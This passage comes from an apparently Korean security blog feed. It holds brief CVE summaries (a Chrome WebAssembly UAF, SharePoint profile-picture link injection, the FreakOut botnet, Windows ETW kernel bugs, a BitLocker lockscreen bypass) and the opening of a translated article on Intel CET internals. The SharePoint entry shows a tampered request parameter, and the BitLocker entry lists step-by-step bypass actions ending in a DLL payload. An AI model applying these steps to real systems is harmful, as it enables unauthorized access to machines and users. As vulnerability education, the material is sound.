객체에 접근하기 위한 인터페이스로 <code>importObject</code>를 사용합니다. 이때 <code>importObject</code>에 Getter를 정의하면 <code>InstanceBuilder::SanitizeImports</code> 함수는 Getter 함수를 콜백으로 호출합니다.</p><p>Getter를  <code>AsyncCompileJob::Abort</code> 로 정의해 콜백 함수로 호출하면 <code>AsyncCompileJob::FinishModule</code> 함수 이후 해제된 <code>AsyncCompileJob</code> 객체에 접근할 수 있어 UAF를 트리거할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
      <tag>webassembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1456 : Unvalidated User Input in MS SharePoint</title>
    <link href="/2021/01/21/idioth/2021-01-21/"/>
    <url>/2021/01/21/idioth/2021-01-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://slashcrypto.org/2021/01/15/CVE-2020-1456/">INSERTION OF MALICIOUS LINKS FOR EXECUTION IN PROFILE PICTURE - UNVALIDATED USER INPUT IN MS SHAREPOINT 2019 (CVE-2020-1456)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2020년 7월 14일 패치 이전 버전<ul><li>Microsoft SharePoint Server 2010 Service Pack 2</li><li>Microsoft SharePoint Server 2019</li><li>Microsoft SharePoint Enterprise Server 2013 Service Pack 1</li><li>Microsoft SharePoint Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint Server에서 유저 프로필 사진에 임의의 링크를 삽입하여 프로필 사진이 삽입된 페이지를 방문하는 사람들을 모두 공격할 수 있는 취약점이 발견되었습니다. SharePoint는 마이크로소프트 오피스 서버 제품군의 웹 애플리케이션 플랫폼으로 기업이나 조직에서 공동 작업, 정보 제공 등의 협업 사이트 구축에 사용됩니다.</p><p>SharePoint의 유저 프로필 설정이 활성화되어 있으면, 사용자는 프로필 사진을 업로드할 수 있습니다. 프로필 사진을 올리고 적용하기 전에 모든 변경 사항을 저장할 수 있습니다. 모든 변경 사항이 저장될 때 POST request로 수행되며 아래와 같이 도메인에 사용자에 대한 변경 사항이 표시됩니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">URL</span>: http://<span class="hljs-number">192.168.0.151</span>/_layouts/<span class="hljs-number">15</span>/EditProfile.aspx?UserSettingsProvider=<span class="hljs-number">234</span>bf<span class="hljs-number">0</span>ed-<span class="hljs-number">70</span>db-<span class="hljs-number">4158</span>-a<span class="hljs-number">332</span>-<span class="hljs-number">4</span>dfd<span class="hljs-number">683</span>b<span class="hljs-number">4148</span>&amp;ReturnUrl=http%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<span class="hljs-number">192.168.0.151</span>%<span class="hljs-number">2</span>fPerson.aspx%<span class="hljs-number">3</span>faccountname%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>C span%<span class="hljs-number">20</span>style=%<span class="hljs-number">22</span>background-color:%<span class="hljs-number">20</span>#fcbd<span class="hljs-number">00</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Epoint%<span class="hljs-number">3</span>C/span%<span class="hljs-number">3</span>E%<span class="hljs-number">255</span>C%<span class="hljs-number">3</span>Cspan%<span class="hljs-number">20</span>style=%<span class="hljs-number">22</span>background-color:%<span class="hljs-number">20</span>#fcbd<span class="hljs-number">00</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Eshareuser%<span class="hljs-number">3</span>C/span%<span class="hljs-number">3</span>E&amp;changephoto=<span class="hljs-number">1</span></code></pre><p>POST request에는 URL 인코딩 된 형태로 업로드된 프로필 사진의 경로를 포함한 파라미터 <code>ct100$PlaceHolderMain$ProfileEditorEditPricturURL</code>가 포함되어 있습니다.</p><pre><code class="hljs angelscript">URL 인코딩 된 파라미터와 값ctl00%<span class="hljs-number">24</span>PlaceHolderMain%<span class="hljs-number">24</span>ProfileEditorEditPictureURL=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F192<span class="hljs-number">.168</span><span class="hljs-number">.0</span><span class="hljs-number">.151</span>%<span class="hljs-number">3</span>A80%<span class="hljs-number">2</span>FUser%<span class="hljs-number">2520</span>Photos%<span class="hljs-number">2</span>FProfilbilder%<span class="hljs-number">2</span>Fpoint_shareuser_Mthumb.jpg수정된 파라미터 값ctl00$PlaceHolderMain$ProfileEditorEditPictureURL=http:<span class="hljs-comment">//123.itsec.de/random.png</span></code></pre><p>POST request를 수정하여 URL 경로를 수정하면 로컬 파일의 경로 대신 수정한 URL 경로가 HTML 이미지 태그의 <code>src</code> 파라미터에 삽입됩니다. 그러면 해당 프로필 사진이 삽입된 페이지를 방문하는 모든 사용자는 백그라운드에서 해당 링크가 열립니다. 해당 취약점을 통해 Denial of Service, Tracking, Internal path disclosure, Obfuscate attacks, Reputation damage 등의 공격을 수행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] FreakOut : from three CVEs to IRC botnet</title>
    <link href="/2021/01/20/fabu1ous/2021-01-20/"/>
    <url>/2021/01/20/fabu1ous/2021-01-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/">Leveraging Newest Vulnerabilities for creating a Botnet</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>아래 세 프로그램 중 하나라도 사용하고 있는 시스템</p><ul><li><p>TerraMaster TOS &lt; 4.2.06</p></li><li><p>Zend Framework &gt; 3.0.0</p></li><li><p>Liferay Portal &lt; 7.2.1 CE GA2</p></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Check Point는 FreakOut이라는 공격과 공격에 사용되는 악성 프로그램 <code>out.py</code>에 대한 정보를 공개했습니다. FreakOut은 아래 세 가지 CVE를 사용해 타겟 시스템에 <code> out.py</code>라는 악성 파이썬 스크립트를 설치하고 실행합니다.</p><ul><li><p>CVE-2020-28188</p><p>TerraMaster TOS(TerraMaster NAS 서버 관리용 운영체제)에서 발견된 RCE 취약점입니다. <code>/include/makecvs.php</code>의 <code>event</code>파라미터의 검증 미흡으로 OS commend injection이 가능합니다.</p></li><li><p>CVE-2021-3007</p><p>Zend Framework(PHP로 만들어진 웹앱 혹은 서비스를 위한 package)에서 발견된 RCE 취약점입니다. <code>__destruct</code> 메소드와 관련된 객체를 컨트롤할 수 있다면 deserializtion 취약점을 통한 원격 코드 실행까지 이어질 수 있습니다. FreakOut은 <code>callback</code>파라미터 값을 통해 해당 취약점을 악용합니다.</p></li><li><p>CVE-2020-7961</p><p>Liferay Portal(Java로 작성된 웹앱 플랫폼)에서 발견된 RCE 취약점입니다. JSONWS(Json web service)에 존재하는 untrusted data에 대한 Java unmarshalling 취약점을 악용해 원격 코드 실행을 할 수 있습니다.</p></li></ul><p>타겟 시스템에 설치된 <code>out.py</code>는 설치될 때마다 다른 방식으로 난독화됩니다. <code>out.py</code>에 감염된 시스템은 IRC를 통해 원격으로 조작할 수 있는 봇넷에 추가되고 아래 2가지 행위에 사용됩니다.</p><ol><li>추가 감염을 위한 공격서버</li><li>코인 마이닝 서버</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>botnet</tag>
      
      <tag>irc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows 커널 하나의 함수에서 발견된 5가지 취약점</title>
    <link href="/2021/01/19/l0ch/2021-01-19/"/>
    <url>/2021/01/19/l0ch/2021-01-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=4">A Series of Windows Kernel Bugs in a Single Function</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows kernel</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows 커널 함수 중 ETW 구성 요소의 함수인 <code>EtwpNotifyGuid</code> 에 5개 이상의 취약점이 발견되었습니다.</p><p>현재까지 발견된 취약점 중 상세 정보가 공개된 취약점 목록은 다음과 같습니다.</p><ul><li>CVE-2020-1033</li><li><a href="https://hackyboiz.github.io/2020/10/26/idioth/cve-2020-1034/">CVE-2020-1034</a></li><li>CVE-2021-1662</li><li>CVE-2021-1682</li></ul><p>이중 최근에 공개된 취약점은 CVE-2021-1662와 CVE-2021-1668입니다.</p><p>CVE-2021-1662는 잘못된 범위 검증으로 인한 권한 상승 취약점으로,  <code>EtwpNotifyGuid</code> 함수에서 <code>input_buffer_length</code> 가 0x90이고 <code>v10</code>이 0x40이면 범위 검사를 통과해 <code>EtwpValidateTraceControlFilterDescriptors</code> 함수에서 OOB 액세스가 가능합니다.</p><p>CVE-2021-1682 또한 잘못된 범위 검증으로 인한 힙 버퍼 오버플로우 취약점입니다. <code>EtwpNotifyGuid</code> 함수는 <code>EtwpAllocDataBlock</code> 함수를 사용해 입력 버퍼를 복사하고 오프셋 0x50에 액세스 합니다. 버퍼 크기를 검사할 때 0x48보다 큰지는 확인하지만 0x50보다 작은 지를 확인하지 않아 0x50보다 작은 버퍼를 할당하면 오프셋 0x50에 액세스 할 때 다음 풀의 헤더를 덮어쓸 수 있어 이를 악용해 권한 상승이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>kernel</tag>
      
      <tag>information disclosure</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1394 : Windows LockScreen Escalation of Privilege</title>
    <link href="/2021/01/18/idioth/2021-01-18/"/>
    <url>/2021/01/18/idioth/2021-01-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://secret.club/2021/01/15/bitlocker-bypass.html">BitLocker Lockscreen bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows BitLocker Lockscreen 우회를 통한 권한 상승 취약점에 대한 세부 사항이 공개되었습니다. BitLocker는 Windows에서 지원하는 디스크 암호화 기능으로 볼륨 전체에 암호화를 제공하여 자료를 보호하도록 설계된 기능입니다. 하지만 다음과 같은 방법으로 관리자 계정을 추가하여 BitLocker를 우회할 수 있습니다.</p><ol><li>로그인 화면에서 “암호를 잊어버렸습니다.”를 선택합니다.</li><li>잠금 우회 후 이동식 드라이브의 자동 실행을 활성화합니다.</li><li>exe 파일과 junction folder가 있는 USB를 삽입합니다.</li><li>실행 파일이 실행되면 USB를 제거한 후 다시 삽입하고 메인 화면으로 돌아갑니다.</li><li>내레이터가 시작되면 설치된 DLL 페이로드가 실행됩니다.</li></ol><p>위의 작업을 수행하기 위해 LockScreen을 우회하는 방법은 다음과 같습니다.</p><ol><li>“암호/PIN을 잊어버렸습니다.”를 선택합니다. </li><li>화면을 볼 수 없으므로 내레이터를 사용하여 탐색을 진행합니다.</li><li>shift 키를 5번 연속으로 누르면, 설정 창을 여는 링크가 있는 창이 뜹니다.</li><li>링크를 클릭해도 시작된 설정 창은 볼 수 없으므로 링크를 1초에 2번 정도 계속 클릭합니다.</li><li>화면에 focus box가 나타나면 해당 창은 설정 창이므로 CapsLock + 왼쪽 화살표를 통해 홈으로 이동합니다.</li><li>CapsLock + 방향키를 통해 장치 - 자동 실행 - 이동식 드라이브 - 폴더를 열어 파일 보기(파일 탐색기)를 선택합니다.</li></ol><p>이후 USB 연결 후 내레이터가 창이 떴다고 했을 때 Exploit.exe 파일을 실행하면 암호를 사용하지 않고 실행이 가능합니다.</p><p>USB가 마운트 될 때 BitLocker는 시스템 볼륨 정보에 <code>ClientRecoveryPasswordRotation</code>이라는 디렉터리를 생성하고 <code>Authenticated Users: (F), SYSTEM: (I) (OI) (CI) (F)</code> 권한을 부여합니다. 디렉터리 생성 작업을 리다이렉트 하기 위해 USB를 사용하여 <code>\System Volume Information</code>을 <code>\RCP Control</code>로 향하는 마운트 포인트로 만듭니다. 그 후 <code>\RPC Control\ClientRecoveryPasswordRoation</code>에 <code>\??\C:\Windows\system32\Narrator.exe.local</code>에 대한 심볼릭 링크를 생성합니다. USB를 다시 삽입하면, <code>C:\Windows\System32\Narrator.exe.locl</code> 폴더는 하위 디렉터리를 생성할 수 있는 권한으로 생성됩니다. 이 하위 디렉터리에 DLL 페이로드를 넣은 후 내레이터가 시작되면, DLL 페이로드가 실행됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>lockscreen</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] R.I.P ROP: CET Internals in Windows 20H1</title>
    <link href="/2021/01/17/l0ch/cet-on-windows/"/>
    <url>/2021/01/17/l0ch/cet-on-windows/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요 L0ch입니다! 지난번 Windows Patch Diffing에 이어 이번엔 번역글로 돌아왔습니다.</p><p>오늘 번역글의 주제는 인텔이 도입한 새로운 미티게이션인 CET입니다. CET는 이전에 우리 막내인 Fabu1ous의 <a href="https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/">x64 stack alignment</a> 글의 마지막에 잠깐 언급되기도 했었죠? 인텔에선 이미 차세대 모바일 플랫폼인 Tiger Lake에 이 기능을 내장했으니 곧 상용화가 머지않았네요.</p><p>첫 번역글이라 오역과 오타가 난무할 수 있습니다.. ㅠㅠ 발견하신다면 가차 없이 지적해주시면 감사하겠습니다.</p><blockquote><p> 원문 글 : <a href="https://windows-internals.com/cet-on-windows/">R.I.P ROP: CET Internals in Windows 20H1</a> </p></blockquote><h2 id="들어가며"><a href="#들어가며" class="headerlink" title="들어가며"></a>들어가며</h2><p>최근 Windows 10의 19H1(Version 1903) 릴리즈 버전에 매우 흥미로운 일이 발생했다. 인텔 <a href="https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf">CET(Control-flow Enforcement Technology)</a> 구현이 수년간의 논의 끝에 시작된 것이다.</p><p>이러한 CET 적용은 모든 버전의 Windows 릴리즈에 추가되고 있으며, 작년(2020) 릴리스인 20H1 (버전 2004)은 Intel Tiger Lake CPU에서 릴리즈 될 CET의 user mode shadow stack 기능에 대한 지원을 완료했다.</p><p>인텔 CET는 익스플로잇에서 일반적으로 사용되는 두 가지 유형의 제어 흐름 무결성 위반인 forward-edge 위반 (indirect CALL 및 JMP)과 backward-edge 위반 (RET)을 해결하는 하드웨어 기반 mitigation이다.</p><p>forward-edge 구현은 새롭지 않지만 (기본적으로 Microsoft의 <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a>와 유사한 형태의 <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">clang-cfi</a>이기 때문이다.) backward-edge 구현은 ISA의 근본적인 변화에 의존한다. Shadow Stack 은 CALL 명령어에 의해 스택에 푸시된 반환 주소를 복제하며, RET 명령어 실행 시 스택 및 섀도우 스택 값을 모두 확인하고 불일치 시 INT #21 (제어 흐름 보호 오류)를 생성한다.</p><p>운영 체제 및 컴파일러는 CALL과 RET 이외의 제어 흐름 시퀀스(예 : 예외 해제 및 <a href="https://en.cppreference.com/w/cpp/utility/program/longjmp">longjmp</a>)를 지원해야 하기 때문에 시스템 수준에서 필요한 동작과 일치하도록 <code>Shadow Stack Pointer(SSP)</code> 를 조작해야 하며, 이 조작 자체가 잠재적인 우회가 되지 않도록 검증해야 한다. 이 게시물에서는 Windows가 이를 달성하는 방법에 대해 설명한다.</p><p>Windows가 스레드에 대한 shadow stack을 조작하고 유효성을 검사하는 방법에 대해 자세히 알아보기 전에 먼저 두 가지를 이해해야 한다. 첫 번째는 SSP의 실제 위치 및 권한이고 두 번째는 SSP스레드 간 콘텍스트 전환 시 저장/복원하는 데 사용되는 메커니즘과 필요한 경우 (예 : 예외 해제 중)  SSP 수정이 수행되는 방법이다.</p><p>이러한 메커니즘을 설명하려면 <a href="https://en.wikipedia.org/wiki/Advanced_Vector_Extensions">AVX(Advanced Vector eXtensions)</a> 명령을 지원하기 위해 Intel에서 도입하고 Windows 7부터 Microsoft가 지원한 Intel CPU 기능을 알아봐야 한다. 또한 이 기능을 사용하기 위해 기존 CONTEXT구조를 문서화되지 않은 CONTEXT_EX구조로 재구성하고 이를 처리하기 위한 native API를 추가하는 것에 대해서도 이야기해야 한다!</p><p>마지막으로 Windows의 CET 기능에 대한 추가적인 요구사항을 다루기 위해 일부 컴파일러 및 PE 파일 포맷의 내부와 새로운 프로세스 정보 클래스를 살펴봐야 한다. 이 글의 목차가 이러한 기능에 대한 전체적인 내용을 탐색하는 데 도움이되기를 바란다. 또한 <a href="https://github.com/yardenshafir/cet-research">관련 GitHub 저장소</a>를 기반으로 함수 이름을 클릭하면 새로 도입된 다양한 함수에 대한 주석이 달린 소스 코드를 사용할 수 있다.</p><h1 id="XState-내부"><a href="#XState-내부" class="headerlink" title="XState 내부"></a>XState 내부</h1><p>x86-x64 아키텍처 클래스 프로세서는 범용 레지스터(RAX, RCX), 제어 레지스터 (RIP, RSP…), 부동 소수점 레지스터 (XMM, YMM, ZMM)와 일부 제어, 디버그 및 테스트 레지스터 등 대부분의 보안 연구자들에게 익숙한 레지스터 세트로 구성되었다. 그러나 더 많은 프로세서 기능이 추가됨에 따라 새 레지스터 및 이러한 기능과 관련된 특정 프로세서 상태를 정의해야 했다. 그리고 이러한 기능 중 많은 부분이 스레드 내부에서 사용하므로 콘텍스트 전환 중에 저장하고 복원해야 한다.</p><p>이에 대한 해결책으로 인텔은 다양한 프로세서 상태를 <code>상태 마스크</code>의 비트와 연결하고 <code>XSAVE</code> 영역에서 요청된 상태를 읽고 쓰기 위한 <code>XSAVE</code> 및 <code>XRSTOR</code>와 같은 명령어를 도입하는 <code>XState(eXtended State)</code> <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developers-manual.pdf">표준</a>을 정의했다. 이 영역은 각 스레드에 대한 CET 레지스터 저장소의 중요한 부분이지만 대부분의 사람들은 기존 부동 소수점, AVX 및 <a href="https://software.intel.com/en-us/articles/introduction-to-intel-memory-protection-extensions">메모리 보호 확장(Memory Protection eXtensions, MPX)</a> 기능에 초점을 두었기 때문에 XSAVE 지원을 대부분 무시하고 있다. 기능 및 메모리 레이아웃에 대한 개요는 독자에게 도움이 될 것이다.</p><h2 id="XSAVE-영역"><a href="#XSAVE-영역" class="headerlink" title="XSAVE 영역"></a>XSAVE 영역</h2><p>앞서 언급했듯이 XSAVE 영역은 원래 Intel에서 프로세서에 추가 한 AVX와 같은 새로운 부동 소수점 기능 중 일부를 저장하고 이전에 <code>FXSTOR</code> 및 <code>FXRSTR</code> 명령을 통해 저장되는 기존 x86 FPU 및 SSE 상태를 통합하는 데 사용되었다. 이 처음 두 개의 레거시 상태는 <code>레거시 XSAVE 영역</code>의 일부로 정의되었으며 추가 프로세서 레지스터 (예 : AVX)는 <code>확장된 XSAVE 영역</code>에 추가되었다. 그 사이에 <code>XSAVE 영역 헤더</code> 는 <code>XSTATE_BV</code>라는 상태 마스크를 통해 어떤 확장 기능이 있는지 설명하는 데 사용된다.</p><p>동시에 XSAVE 기능의 일부로 운영체제에서 지원하는 상태를 정의하는 새로운 <code>XCR0(eXtended Control Register)</code>가 추가되었으며 XCR0을 구성하기 위해 <code>XGETBV</code> 및 <code>XSETBV</code> 명령이 추가되었다. (이후에 추가될 <code>XCR</code>도 마찬가지이다.) 예를 들어 운영체제는 x87 FPU 및 SSE에 대한 기능 상태 비트를 포함하지 않도록, 즉 레거시 <code>FXSTOR</code> 명령을 사용하여 수동으로 저장하고 확장된 기능의 상태만 XSAVE 영역에 저장하도록 XCR0을 프로그래밍해 선택할 수 있다.</p><p><code>PKRU(Protection Key Register User State)</code>를 추가한  <a href="https://www.kernel.org/doc/html/latest/core-api/protection-keys.html">MPK(Memory Protection Key)</a>와 같은 고급 레지스터 세트 및 기능의 수가 증가함에 따라 최신 프로세서는 <code>XSAVES</code> 및 <code>XRSRTORS</code>를 사용하는 CPL0 코드로만 수정할 수 있는 슈퍼바이저 상태와 압축 및 최적화 버전 (<code>XSAVEC</code> / <code>XSAVEOPT</code>)으로 구분해 인텔만의 방식으로 복잡하게 만들었다. 슈퍼바이저 전용 상태를 정의하기 위해 <code>IA32_XSS</code>라는 새로운 <code>MSR(Model Specific Register)</code>이 추가되었다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/1.png"></p><blockquote><p>optimized XSAVE 영역 vs not optimized XSAVE 영역<br>(VX 및 CET_U가 노트 활성화되고 IPT 및 PKRU가 활성화되었지만 마지막 콘텍스트 전환 이후에 사용되지 않은 스레드)</p></blockquote><p><code>Optimized XSAVE</code> 메커니즘은 마지막 콘텍스트 스위치 (있는 경우) 이후 다른 스레드에 의해 실제로 수정된 프로세서 상태만 XSAVE영역에 기록할 수 있게 해 주며 내부 프로세서 레지스터는 <code>XINUSE</code>이 정보를 추적할 수 있게 해 준다. <code>XSAVEOPT</code>를 사용할 때 <code>XSTATE_BV</code> 마스크는 요청된 모든 상태가 아니라 실제로 저장된 상태에 해당하는 비트만 포함된다.</p><p>반면 <code>Compacted XSAVE</code> 메커니즘은 기존 XState 디자인의 결함을 수정했다. <code>AVX512</code> 및 <a href="https://software.intel.com/content/www/us/en/develop/blogs/processor-tracing.html">IPT(Intel Processor Trace)</a>와 같은 더 많은 확장 기능이 추가됨에 따라 이러한 기능을 사용하지 않으면 큰 XSAVE영역을 할당하고 0으로 기록해야 한다. <code>Optimized XSAVE</code>는 이러한 낭비를 피할 수 있지만 여전히 사용되지 않는 확장 기능은 기본 XSAVE 영역 버퍼로부터 큰 오프셋에 있음을 의미한다.</p><p><code>XSAVEC</code>를 사용하면 현재 스레드에 의해 실제로 활성화된 XState 기능을 저장하기 위한 공간만 사용하고 저장된 각 상태를 순차적으로 메모리에 배치함으로써 문제를 해결할 수 있다. (CPUID를 통해 <code>정렬 마스크</code>의 일부로 제공되는 고정 64-byte 정렬을 사용할 수 있다.)</p><p>이전에 표시된 XSAVE 영역 헤더는 두 번째 상태 마스크인 <code>XCOMP_BV</code>로 확장되어 요청된 상태 비트 중 어느 것이 비교 영역에 있을 수 있는지 나타낸다. <code>XSTATE_BV</code>와 달리 이 마스크는 <code>XINUSE</code>의 일부가 아닌 상태 비트를 생략하지 않아 압축될 수 있는 모든 가능한 비트를 포함하므로 <code>XSTATE_BV</code>를 통해 실제로 어떤 상태 영역이 있는지 확인해야 한다. 마지막으로, 압축된 명령어가 사용될 때 비트 63은 항상 <code>XCOMP_BV</code>에서 XSAVE 영역에 대한 지시자로 설정된다.</p><p>따라서 압축된 포맷인지에 따라 XSAVE 영역의 내부 레이아웃과 크기가 결정된다. 압축된 포맷은 스레드에서 사용하는 프로세서 기능에 대해서만 XSAVE 영역의 메모리를 할당하고, 압축되지 않은 포맷은 프로세서가 지원하는 모든 프로세서 기능에 대해 메모리를 할당하고 스레드에서 사용하는 기능만 사용한다. 아래 다이어그램은 동일한 스레드에 대해 XSAVE 영역이 어떻게 보이는지, 각각의 포맷을 사용할 때의 예를 보여준다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/2.png"></p><blockquote><p>Compacted XSAVE vs not Compacted XSAVE AVX 및 CET_U가 활성화되지 않은 스레드, 이러한 기능을 지원하는 프로세서에서 실행됨</p></blockquote><p>요약하자면,  <code>XSAVE</code>와 <code>XRSTOR</code> 명령어 집합은 다음과 같은 조합과 함께 사용된다.</p><ol><li>OS가 XCR0을 지원할 때 설정되는 상태 비트 (<code>XSETBV</code> 명령어를 사용하여 설정)</li><li><code>XSAVE</code> 명령을 사용할 때 호출자가 EDX : EAX에 저장하는 상태 비트 (인텔에서는 이를 <code>instruction mask</code>라고 함)</li><li>권한이 없는 명령어를 사용하는 경우 <code>IA32_XSS</code>에 설정되지 않은 상태 비트</li><li><code>XINUSE</code>에 설정된 상태 비트인 <code>최적화된 XSAVE</code>를 지원하는 프로세서에서 마지막 전환 이후 현재 스레드에서 사용된 실제 XState 관련 레지스터를 추적하는 내부 레지스터</li></ol><p>이러한 비트가 함께 마스킹되면 <code>XSAVE</code> 명령에 의해 <code>XSTATE_BV</code> 필드의 XSAVE 영역의 헤더에 최종 상태 비트가 기록된다. <code>Compacted XSAVE</code>를 사용하는 경우 <code>XINUSE</code>를 생략한 결과 상태 비트가  <code>XCOMP_BV</code> 필드에 XSAVE 영역의 헤더에 기록된다. 아래 다이어그램은 결과 마스크를 보여준다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/3.png"></p><h2 id="XState-구성"><a href="#XState-구성" class="headerlink" title="XState 구성"></a>XState 구성</h2><p>각 프로세서에는 자체적인 XState 활성화 기능, 예상되는 크기, 기능 및 메커니즘 세트를 가지고 있어 Intel은 운영 체제가 XState를 처리할 때 쿼리 해야 하는 다양한 CPUID 클래스를 통해 정보를 노출한다. Windows는 부팅 시 이러한 쿼리를 수행하고 <code>XSTATE_CONFIGURATION</code> 아래에 표시된 구조에 정보를 저장한다. (Winnt.h에 문서화됨)</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSTATE_CONFIGURATION</span></span><span class="hljs-class">&#123;</span>    ULONG64 EnabledFeatures;    ULONG64 EnabledVolatileFeatures;    ULONG Size;    <span class="hljs-keyword">union</span>    &#123;        ULONG ControlFlags;        <span class="hljs-class"><span class="hljs-keyword">struct</span></span><span class="hljs-class">        &#123;</span>            ULONG OptimizedSave:<span class="hljs-number">1</span>;            ULONG CompactionEnabled:<span class="hljs-number">1</span>;        &#125;;    &#125;;    XSTATE_FEATURE Features[MAXIMUM_XSTATE_FEATURES];    ULONG64 EnabledSupervisorFeatures;    ULONG64 AlignedFeatures;    ULONG AllFeatureSize;    ULONG AllFeatures[MAXIMUM_XSTATE_FEATURES];    ULONG64 EnabledUserVisibleSupervisorFeatures;&#125; XSTATE_CONFIGURATION, *PXSTATE_CONFIGURATION;</code></pre><p>이 데이터들을 보관한 후 커널은 <code>KUSER_SHARED_DATA</code> 구조체에 저장한다. 이 구조체는 <code>SharedUserData</code> 변수를 통해 액세스 할 수 있으며 모든 Windows 플랫폼의 <code>0x7FFE0000</code> 주소에 존재한다.</p><p>Optimized, Compacted XSAVE를 모두 지원하고 x87 FPU(0), SSE(1), AVX(2) 및 MPX(3, 4) 기능 비트를 지원하는 테스트 <code>19H1</code> 시스템의 출력을 예로 들 수 있다.</p><pre><code class="hljs c">dx ((nt!_KUSER_SHARED_DATA*)<span class="hljs-number">0x7ffe0000</span>)-&gt;XState    [+<span class="hljs-number">0x000</span>] EnabledFeatures  : <span class="hljs-number">0x1f</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x008</span>] EnabledVolatileFeatures : <span class="hljs-number">0xf</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x010</span>] Size             : <span class="hljs-number">0x3c0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span>] ControlFlags     : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span> ( <span class="hljs-number">0</span>: <span class="hljs-number">0</span>)] OptimizedSave    : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x014</span> ( <span class="hljs-number">1</span>: <span class="hljs-number">1</span>)] CompactionEnabled : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x018</span>] Features         [Type: _XSTATE_FEATURE [<span class="hljs-number">64</span>]]    [+<span class="hljs-number">0x218</span>] EnabledSupervisorFeatures : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x220</span>] AlignedFeatures  : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x228</span>] AllFeatureSize   : <span class="hljs-number">0x3c0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x22c</span>] AllFeatures      [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> [<span class="hljs-number">64</span>]]    [+<span class="hljs-number">0x330</span>] 